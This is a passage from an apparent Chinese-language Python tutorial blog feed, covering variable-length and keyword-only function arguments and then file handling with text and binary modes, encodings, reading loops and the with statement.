class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>) <span class="comment"># 1 2 (3, 4, 5, 6)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 任意输入求和案例</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_sum</span>(<span class="params">*args</span>):</span> </span><br><span class="line">    sum = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> args:</span><br><span class="line">        sum = sum+i</span><br><span class="line">    <span class="keyword">return</span> sum</span><br><span class="line">res = my_sum(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>)</span><br><span class="line">print(res)</span><br><span class="line"></span><br><span class="line"><span class="comment"># *用在实参中，是将值进行拆分,但是就需要形参实参数量相等了</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">x,y,z</span>):</span></span><br><span class="line">    print(x,y,z)</span><br><span class="line">func(*[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]) <span class="comment"># 1 2 3</span></span><br><span class="line"><span class="comment"># 形参实参都带*</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">x,y,*args</span>):</span></span><br><span class="line">    print(x,y,args)</span><br><span class="line">func(<span class="number">1</span>,<span class="number">2</span>,[<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]) <span class="comment"># 1 2 ([3, 4, 5],)</span></span><br><span class="line">func(<span class="number">1</span>,<span class="number">2</span>,*[<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]) <span class="comment"># 1 2 (3, 4, 5)</span></span><br></pre></td></tr></table></figure><p><strong>可变长度的关键字参数</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># **形参名：用来接收溢出的关键字实参,**会将溢出的关键字实参保存成字典格式，然后赋值**形参名</span></span><br><span class="line"><span class="comment">## **形参名可以是任意名字，但kwargs是默认的规范(推荐使用)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">x,y, **kwargs</span>):</span></span><br><span class="line">    print(x,y,kwargs)</span><br><span class="line">func(<span class="number">1</span>,y=<span class="number">2</span>,a=<span class="number">1</span>,b=<span class="number">2</span>,c=<span class="number">3</span>) <span class="comment"># 1 2 &#123;&#x27;a&#x27;: 1, &#x27;b&#x27;: 2, &#x27;c&#x27;: 3&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># **用在实参中(**后只能跟字典)，是将值进行拆分,拆分成关键字实参</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">x,y,z</span>):</span> <span class="comment"># 必须一一对应</span></span><br><span class="line">    print(x,y,z)</span><br><span class="line">func(*&#123;<span class="string">&#x27;x&#x27;</span>:<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;y&#x27;</span>:<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;z&#x27;</span>:<span class="string">&#x27;c&#x27;</span>&#125;) <span class="comment"># x y z 使用位置参数会导致key被传入</span></span><br><span class="line">func(**&#123;<span class="string">&#x27;x&#x27;</span>:<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;y&#x27;</span>:<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;z&#x27;</span>:<span class="string">&#x27;c&#x27;</span>&#125;) <span class="comment"># a b c</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 形参实参都带**</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">x,y,**kwargs</span>):</span></span><br><span class="line">    print(x,y,kwargs)</span><br><span class="line">func(**&#123;<span class="string">&#x27;x&#x27;</span>:<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;y&#x27;</span>:<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;z&#x27;</span>:<span class="string">&#x27;c&#x27;</span>&#125;) <span class="comment"># a b &#123;&#x27;z&#x27;: &#x27;c&#x27;&#125;</span></span><br><span class="line"><span class="comment"># 打散后 x=a,y=b,z=c 但是**kwargs溢出被保存为字典 &#123;&#x27;z&#x27;: &#x27;c&#x27;&#125;</span></span><br></pre></td></tr></table></figure><p><strong>可变关键字位置参数与可变关键字长度参数混用</strong></p><p>简称<code>*与**</code>的混用(*args必须在**kwargs之前)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将wrapper的参数原封不动给了index</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>(<span class="params">x,y</span>):</span></span><br><span class="line">    print(x,y)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wrapper</span>(<span class="params">*args,**kwargs</span>):</span></span><br><span class="line">    <span class="comment"># *args必须在**kwargs之前</span></span><br><span class="line">    index(*args,**kwargs)</span><br><span class="line">wrapper(<span class="number">1</span>,y=<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行过程：</span></span><br><span class="line"><span class="comment">## 1.wrapper的*args接收到参数1，*args处理成元组args=(1,)，**kwargs接收到参数处理成字典kwargs=&#123;&#x27;y&#x27;:2&#125;</span></span><br><span class="line"><span class="comment">## 2.调用index，函数变成了index(*(1,),**&#123;&#x27;y&#x27;:2&#125;)</span></span><br><span class="line"><span class="comment">## 3.index接收参数index(1,y=2)</span></span><br></pre></td></tr></table></figure><h2 id="命名关键字参数"><a href="#命名关键字参数" class="headerlink" title="命名关键字参数"></a>命名关键字参数</h2><p>在定义函数时，*后定义的参数，如下所示，称之为命名关键字参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 特点：命名关键字参数必须按照关键字传值</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">x,y,*,a,b</span>):</span></span><br><span class="line">    <span class="comment"># *或者*args后面的a,b被称为命名关键字参数</span></span><br><span class="line">    print(x,y)</span><br><span class="line">    print(a,b)</span><br><span class="line"><span class="comment"># func(1,2,3,4) # func() takes 2 positional arguments but 4 were given</span></span><br><span class="line">func(<span class="number">1</span>,<span class="number">2</span>,a=<span class="number">1</span>,b=<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>给命名关键字参数赋予默认值(注意:这里不叫默认参数)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">x,*,a=<span class="number">1</span>,b</span>):</span></span><br><span class="line">    <span class="comment"># 这里不是默认形参，所以a赋默认值可以在b前面</span></span><br><span class="line">    print(x,a,b)</span><br><span class="line">func(<span class="number">1</span>,b=<span class="number">2</span>) <span class="comment"># 1 1 2</span></span><br></pre></td></tr></table></figure><h2 id="组合使用顺序"><a href="#组合使用顺序" class="headerlink" title="组合使用顺序"></a>组合使用顺序</h2><p>学习了这么多，我们组合使用的时候需要遵循一个最基本的先后顺序</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定义顺序：位置形参、默认形参、*args、命名关键字形参、**kwargs</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">x,y=<span class="number">111</span>,*args,z,**kwargs</span>):</span></span><br><span class="line">    <span class="comment"># z是命名关键字参数</span></span><br><span class="line">    print(x,y,args,z,kwargs)</span><br></pre></td></tr></table></figure><h3 id="实参顺序"><a href="#实参顺序" class="headerlink" title="实参顺序"></a>实参顺序</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">x,y,z,a,b,c</span>):</span></span><br><span class="line">    print(x,y,z,a,b,c)</span><br><span class="line"><span class="comment"># func(111,y=222,*[333,444],**&#123;&#x27;b&#x27;:555,&#x27;c&#x27;:666&#125;)</span></span><br><span class="line"><span class="comment"># 报错：func() got multiple values for argument &#x27;y&#x27;</span></span><br><span class="line"><span class="comment"># 打散后：111,y=222,333,444,b=555,c=666</span></span><br><span class="line">func(<span class="number">111</span>,a=<span class="number">222</span>,*[<span class="number">333</span>,<span class="number">444</span>],**&#123;<span class="string">&#x27;b&#x27;</span>:<span class="number">555</span>,<span class="string">&#x27;c&#x27;</span>:<span class="number">666</span>&#125;) <span class="comment"># 本质还是形参位置问题 111 333 444 222 555 666</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 程序语言 </category>
          
          <category> Python </category>
          
          <category> python基础 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>16.python的文件处理</title>
      <link href="%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Python/python%E5%9F%BA%E7%A1%80/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/python/16.python%E7%9A%84%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86/"/>
      <url>%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Python/python%E5%9F%BA%E7%A1%80/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/python/16.python%E7%9A%84%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>应用程序运行过程中产生的数据最先都是存放于内存中的，若想永久保存下来，必须要保存于硬盘中。应用程序若想操作硬件必须通过操作系统，而文件就是操作系统提供给应用程序来操作硬盘的虚拟概念。</p><p>用户或应用程序对文件的操作，就是向操作系统发起调用，然后由操作系统完成对硬盘的具体操作。</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20201103104857210.png" alt="image-20201103104857210"></p><a id="more"></a><hr><h1 id="控制文件读写内容的模式"><a href="#控制文件读写内容的模式" class="headerlink" title="控制文件读写内容的模式"></a>控制文件读写内容的模式</h1><p>强调<code>t</code>和<code>b</code>不能单独使用，必须跟<code>r/w/a</code>连用</p><h2 id="文本模式-默认模式"><a href="#文本模式-默认模式" class="headerlink" title="文本模式(默认模式)"></a>文本模式(默认模式)</h2><p>文本模式顾名思义存放的就是文本文件，使用t进行读取会默认将硬盘中的二进制转成字符(如果最初不是由字符转换成的二进制，会导致编码报错)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">二进制(默认编码&#x2F;encoding指定) &lt;-&gt; t控制转换为Unicode &lt;-&gt; 字符</span><br></pre></td></tr></table></figure><ul><li><p>操作的只能是文本文件</p></li><li><p>文本文件的读写都是以str(unicode)为单位</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 硬盘文件c内容默认格式(例如utf-8)，而t模式要求读取为unicode模式</span></span><br><span class="line">f = open(<span class="string">&#x27;c&#x27;</span>,mode=<span class="string">&#x27;rt&#x27;</span>)</span><br><span class="line">res = f.read() <span class="comment"># 即读取时候进行转码  utf-8 -解码-&gt; unicode</span></span><br><span class="line"><span class="comment"># 这里解码默认为操作系统的默认的解码方式</span></span><br><span class="line"><span class="comment">## linux和mac系统默认编码是utf-8 ，windows系统默认为gbk</span></span><br></pre></td></tr></table></figure><p>如果不指定，就会导致乱码问题(调用文件内容不是英文)</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20201104160531483.png" alt="image-20201104160531483"></p></li><li><p>必须为指定<code>encoding=&#39;编码&#39;</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding = &#x27;utf-8&#x27;</span></span><br><span class="line">open(<span class="string">&#x27;aaa.txt&#x27;</span>,mode=<span class="string">&#x27;rt&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f1</span><br></pre></td></tr></table></figure></li></ul><h2 id="二进制模式"><a href="#二进制模式" class="headerlink" title="二进制模式"></a>二进制模式</h2><p>在打开是图片、视频、软件的时候，我们不能使用t模式，报错提示该文件不是gbk编码，所以解码失败</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 错误演示 - t模式只能读取文本</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">r&#x27;C:\Users\kinght\Videos\123.mkv&#x27;</span>,mode=<span class="string">&#x27;rt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="comment"># open 只是创建文件句柄，所以不会出错</span></span><br><span class="line">    f.read() <span class="comment"># &#x27;gbk&#x27; codec can&#x27;t decode byte 0xa3 in position 4: illegal multibyte sequence</span></span><br><span class="line">    <span class="comment"># 硬盘二进制读入内存 -&gt; t模式会将其进行decode解码(非文本会报错)</span></span><br></pre></td></tr></table></figure><p>而b模式，就是硬盘读入内存，不做任何转换，可以针对<strong>所有的文件类型</strong>进行操作</p><p>而会将输出整合bytes类型  但其实就是二进制，以后操作<strong>bytes类型直接当成二进制使用</strong>，python自动转成二进制</p><p>注意：由于b模式哪怕打开的是文本文件，但是由于模式限定并不会做任何转换，所以也不能指定encoding参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 错误演示</span></span><br><span class="line"><span class="comment"># with open(&#x27;user&#x27;,mode=&#x27;rb&#x27;,encoding=&#x27;utf-8&#x27;) as f:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 不能指定encoding参数</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;user&#x27;</span>,mode=<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    res = f.read()</span><br><span class="line">    print(type(res))</span><br><span class="line">    print(res) <span class="comment"># 显示的十六进制</span></span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20201111114732230.png" alt="image-20201111114732230"></p><p>由于他没做任何的转码操作，所以这里取出来的二进制是系统对应的二进制直接取出(详情回看编码那一章节)，这里的user文件时直接在pycharm生成，所以是utf-8格式</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20201112115652478.png" alt="image-20201112115652478"></p><h3 id="b模式读写文本文件"><a href="#b模式读写文本文件" class="headerlink" title="b模式读写文本文件"></a>b模式读写文本文件</h3><p><strong>读：手工解码转成字符</strong></p><p>其实t模式就是一种b模式针对文本文件加解码的简洁模式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;user&#x27;</span>,mode=<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    res = f.read().decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    print(res)</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20201112120521037.png" alt="image-20201112120521037"></p><p>写：<strong>字符编码转成二进制</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;user&#x27;</span>,mode=<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">&quot;你好呀!&quot;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)) <span class="comment"># 需要自行编码</span></span><br></pre></td></tr></table></figure><h3 id="文件拷本案例"><a href="#文件拷本案例" class="headerlink" title="文件拷本案例"></a>文件拷本案例</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">src_file = input(<span class="string">&#x27;源文件路径&gt;&gt;&gt;：&#x27;</span>).strip()</span><br><span class="line">dst_file = input(<span class="string">&#x27;目的文件路径&gt;&gt;&gt;:&#x27;</span>).strip()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">r&#x27;&#123;&#125;&#x27;</span>.format(src_file),mode=<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f1,\</span><br><span class="line">    open(<span class="string">r&#x27;&#123;&#125;&#x27;</span>.format(dst_file),mode=<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f2:</span><br><span class="line">    <span class="comment"># f2.write(f1.read()) # 如果数据量太大会冲爆内存</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f1:</span><br><span class="line">        f2.write(line)</span><br></pre></td></tr></table></figure><h3 id="循环的文件读取"><a href="#循环的文件读取" class="headerlink" title="循环的文件读取"></a>循环的文件读取</h3><p><strong>for循环：以行为单位，如果单行过长，会导致一次性读取内容数据量过大</strong></p><p>如文件拷贝案例一样，无论是文本文件、视频、图片还是其他的文件，for循环均是以换行符作为分隔(图片、视频、软件都有换行符)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">r&quot;D:\ide\pycharm\PyCharm 2020.1.2\bin\pycharm64.exe&quot;</span>,mode=<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f1:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f1:</span><br><span class="line">        print(line)</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20201113235839918.png" alt="image-20201113235839918"></p><p>注意：有些行由于过长占用了续行，每个b’才是一个真正的行</p><p><strong>while循环：可自行控制单次读取数据量</strong></p><p>while循环由于不能直接按行读取，所以需要指定往后读的字节数，如果文件单行过长，建议使用while循环</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">r&quot;D:\ide\pycharm\PyCharm 2020.1.2\bin\pycharm64.exe&quot;</span>,mode=<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f1:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># 可以规定一次读几个字节</span></span><br><span class="line">        res = f1.read(<span class="number">1024</span>)  <span class="comment"># 往后读1024个字节</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> res:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(res) <span class="comment"># 如果res不为0 返回res长度</span></span><br></pre></td></tr></table></figure><hr><h1 id="文件操作基本流程"><a href="#文件操作基本流程" class="headerlink" title="文件操作基本流程"></a>文件操作基本流程</h1><h2 id="1-打开文件"><a href="#1-打开文件" class="headerlink" title="1.打开文件"></a>1.打开文件</h2><h3 id="win平台-当路径分隔符与转义冲突的解决方案"><a href="#win平台-当路径分隔符与转义冲突的解决方案" class="headerlink" title="win平台 - 当路径分隔符与转义冲突的解决方案"></a>win平台 - 当路径分隔符与转义冲突的解决方案</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># r = rawstring 原生字符串 - 不经过任何转义</span></span><br><span class="line">open(<span class="string">r&#x27;E:\code\python\demo\first\Include\aaa.txt&#x27;</span>)</span><br><span class="line"><span class="comment"># 左斜杠 - 系统会自动识别左斜杠为路径符(linux平台直接就是左斜杠)</span></span><br><span class="line">open(<span class="string">&#x27;E:/code/python/demo/first/Include/aaa.txt&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="open-有返回值"><a href="#open-有返回值" class="headerlink" title="open 有返回值"></a>open 有返回值</h3><p>应用程序向操作系统的文件系统发起系统调用open(…)请求，操作系统找到对应一块硬盘空间，并返回一个文件对象赋值给一个变量f</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># f的值是一种变量，占用本应用程序的内存空间</span></span><br><span class="line">f = open(<span class="string">&#x27;aaa.txt&#x27;</span>,mode=<span class="string">&#x27;rt&#x27;</span>)  <span class="comment"># 默认控制文件操作模式为r 默认控制文件读写模式为t 在这里写很鸡肋，但是为了更直观</span></span><br><span class="line">print(f) <span class="comment"># &lt;_io.TextIOWrapper name=&#x27;aaa.txt&#x27; mode=&#x27;r&#x27; encoding=&#x27;cp936&#x27;&gt; - 新的数据类型，叫做文件类型</span></span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/v2-df5334d72003b1b12e88bdf983af6b5d_720w.jpg" alt="img"></p><h2 id="2-操作文件：读-写"><a href="#2-操作文件：读-写" class="headerlink" title="2.操作文件：读/写"></a>2.操作文件：读/写</h2><p>应用程序对文件的读写请求都是在向操作系统发起系统调用，然后再用操作系统控制数据读入内存或者写入硬盘</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 读文件内容</span></span><br><span class="line">res = f.read()</span><br><span class="line">print(res) <span class="comment"># 123 - aaa.txt中的内容</span></span><br><span class="line">res = f.</span><br></pre></td></tr></table></figure><h2 id="3-关闭文件"><a href="#3-关闭文件" class="headerlink" title="3.关闭文件"></a>3.关闭文件</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">f.close() <span class="comment"># 回收操作系统打开的文件资源</span></span><br><span class="line"><span class="keyword">del</span> f   <span class="comment"># 回收应用程序级的变量</span></span><br></pre></td></tr></table></figure><p>这个先后顺序不能改变，如果先回收变量，就无法再使用变量名.close()回收文件资源了</p><p>甚至说由于python解释器会自动对变量进行内存管理，可以不写<code>del f</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">f.close() <span class="comment"># 回收操作系统打开的文件资源</span></span><br><span class="line"><span class="comment"># 只关闭了操作系统的文件资源，而不解除变量，变量还在，但是不能进行文件操作了</span></span><br><span class="line">print(f) <span class="comment"># &lt;_io.TextIOWrapper name=&#x27;aaa.txt&#x27; mode=&#x27;rt&#x27; encoding=&#x27;cp936&#x27;&gt;</span></span><br><span class="line">print(f.read()) <span class="comment"># ValueError: I/O operation on closed file.</span></span><br></pre></td></tr></table></figure><p>但是系统规定了能够打开文件的数量，python解释器不能自动控制回收操作系统，所以<code>f.close()</code>还是很重要的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># linux系统中使用ulimit -u可查看能够同时打开的文件数</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20201103142309522.png"></p><blockquote><p>操作系统会在一定时间范围内扫描文件，如果文件系统没有了使用，也会自动关闭文件，但是这个期间内所导致的性能损耗也是非常大的</p></blockquote><h2 id="with语句"><a href="#with语句" class="headerlink" title="with语句"></a>with语句</h2><p>with open(…) as …语句，在子代码块完成后自动运行<code>f.close</code>回收文件资源</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 小贴士：除去windows系统外，其它系统均不会以后缀名作为区分文件类型的方式</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件对象 又称为 文件句柄 ： 其实就是控制文件的</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;aaa.txt&#x27;</span>,mode=<span class="string">&#x27;rt&#x27;</span>) <span class="keyword">as</span> f1:</span><br><span class="line">    res = f1.read()</span><br><span class="line">    print(res) <span class="comment"># aaaa</span></span><br><span class="line"><span class="comment"># with的子代码块运行完成后，会自动运行f.close()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># with 同时打开多个文件</span></span><br><span class="line">    <span class="comment"># 加上\代表下一行还属于这一行 只是为了美观进行的换行</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;aaa.txt&#x27;</span>,mode=<span class="string">&#x27;rt&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f1,\</span><br><span class="line">        open(<span class="string">&#x27;bbb&#x27;</span>,mode=<span class="string">&#x27;rt&#x27;</span>) <span class="keyword">as</span> f2:</span><br><span class="line">    res1 = f1.read() <span class="comment"># res1文件内容为中文由于是windows平台，需要指定utf-8</span></span><br><span class="line">    res2 = f2.read()</span><br><span class="line">    print(res1,res2) <span class="comment"># 哈哈 bbbb</span></span><br></pre></td></tr></table></figure><hr><h1 id="文件读写的模式"><a href="#文件读写的模式" class="headerlink" title="文件读写的模式"></a>文件读写的模式</h1><p>所有演示均以t模式为操作模式</p><h2 id="r模式-只读模式"><a href="#r模式-只读模式" class="headerlink" title="r模式(只读模式)"></a>r模式(只读模式)</h2><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 当文件不存在时</span></span><br><span class="line"><span class="comment"># with open(&#x27;d.txt&#x27;,mode=&#x27;rt&#x27;,encoding=&#x27;utf-8&#x27;) as f:</span></span><br><span class="line"><span class="comment">#     ... # 会报错</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 当文件存在时</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;aaa.txt&#x27;</span>,mode=<span class="string">&#x27;rt&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    print(<span class="string">&#x27;第一次读取&#x27;</span>.center(<span class="number">50</span>,<span class="string">&#x27;*&#x27;</span>))</span><br><span class="line">    <span class="comment"># f.read 从硬盘把文件指针内容从头读到结尾 - 一次性全读</span></span><br><span class="line">    <span class="comment"># 如果文件过大会导致占用内存过多</span></span><br><span class="line">    res = f.read()</span><br><span class="line">    print(res)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">&#x27;第二次读取&#x27;</span>.center(<span class="number">50</span>,<span class="string">&#x27;*&#x27;</span>))</span><br><span class="line">    <span class="comment"># 第二次读取是不会有内容的，因为with open把文件打开后，r模式让文件指针在最前面，所以可以读取</span></span><br><span class="line">    <span class="comment"># 但是经过一次的.red之后，文件指针已经在最末尾了，所以不能再次读取</span></span><br><span class="line">    res1 = f.read()</span><br><span class="line">    print(res1)</span><br></pre></td></tr></table></figure><h3 id="修改登陆案例"><a href="#修改登陆案例" class="headerlink" title="修改登陆案例"></a>修改登陆案例</h3><p>新建user文件存放账号密码</p><p><strong>第一次修改文件</strong></p><p>user文件内容</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 